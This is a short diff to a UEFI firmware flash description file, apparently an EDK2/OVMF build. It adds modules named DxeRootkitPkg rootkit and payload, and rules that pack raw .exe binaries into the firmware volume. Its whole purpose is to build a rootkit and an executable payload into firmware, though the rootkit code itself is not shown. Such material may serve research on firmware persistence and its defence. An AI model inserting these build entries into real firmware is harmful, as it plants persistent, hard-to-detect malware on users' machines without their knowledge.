@@ -396,6 +396,10 @@ INF  SecurityPkg/Tcg/Tcg2Config/Tcg2ConfigDxe.inf
 !endif
 !endif
 
+INF DxeRootkitPkg/rootkit/rootkit.inf
+INF uefi-driver/uefi_driver.inf
+INF DxeRootkitPkg/payload/payload.inf
+
 ################################################################################
 
 [FV.FVMAIN_COMPACT]
@@ -513,6 +517,16 @@ FILE FV_IMAGE = 9E21FD93-9C72-4c15-8C4B-E77F1DB2D792 {
 [Rule.Common.USER_DEFINED.CSM]
   FILE FREEFORM = $(NAMED_GUID) {
     RAW BIN                |.bin
+  }
+
+[Rule.Common.USER_DEFINED]
+  FILE FREEFORM = $(NAMED_GUID) {
+    RAW BIN                |.exe
+  }
+
+[Rule.Common.USER_DEFINED.BINARY]
+  FILE FREEFORM = $(NAMED_GUID) {
+    RAW BIN                |.exe
   }
 
 [Rule.Common.SEC.RESET_VECTOR]
